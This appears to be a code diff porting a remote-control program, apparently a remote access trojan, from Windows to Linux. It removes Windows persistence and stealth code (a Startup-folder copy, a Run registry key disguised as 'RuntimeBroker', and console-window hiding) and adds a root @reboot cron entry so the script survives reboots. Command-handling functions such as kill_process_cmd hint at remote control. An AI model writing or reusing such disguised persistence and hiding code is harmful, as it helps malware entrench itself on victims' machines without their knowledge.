@@ -1,9 +1,6 @@
-import shutil
+import os
 import subprocess
 import time
-import win32console
-import win32gui
-import psutil
 import threading
 
 def kill_process_cmd(message):
@@ -124,20 +121,9 @@ def get_all_services_cmd(message):
 
 def add_to_startup_1():
     try:
-        shutil.copy(__file__, f"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
-        return "Add to startup folder Success"
+        script_path = os.path.abspath(__file__)
+        cron_file = '/etc/cron.d/startup_script'
+
+        with open(cron_file, 'w') as f: f.write(f'@reboot root {script_path}\n')
+        return "Added to startup cron Success"
     except Exception as e: return f"Error in add_to_startup_1(): {e}"
-
-def add_to_startup_2():
-    try:
-        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'
-        key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
-        SetValueEx(key2change, "RuntimeBroker", 0, REG_SZ, __file__)
-    except Exception as e: return f"Error occured in add_to_startup_2(): {e}"
-    return "Successfully added startup regkey"
-
-def hide():
-    try:
-        window = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(window, 0)
-    except: pass
